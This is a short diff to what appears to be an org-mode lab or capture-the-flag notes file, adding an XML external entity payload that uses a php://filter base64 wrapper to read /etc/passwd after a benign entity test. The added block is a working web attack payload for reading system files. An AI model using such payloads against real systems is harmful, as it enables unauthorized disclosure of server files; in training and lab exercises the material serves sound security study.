@@ -402,3 +402,8 @@ What is the username of the last user added in /etc/passwd?
 #+begin_src xml
 <?xml version="1.0"?> <!DOCTYPE test [ <!ENTITY name "Cyber"> ]> <contact>     <firstName>Usuário</firstName>     <lastName>Teste</lastName>     <email>email@teste.com</email>     <message>Olá, &name;!</message> </contact>
 #+end_src
+
+*works payload to get the /etc/passwd* ->
+#+begin_src xml
+<?xml version="1.0"?> <!DOCTYPE foo [     <!ENTITY passwd_file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> ]> <contact>     <firstName>Usuario</firstName>     <lastName>Teste</lastName>     <email>email@teste.com</email>     <message>Conteúdo do arquivo: &passwd_file;</message> </contact>
+#+end_src
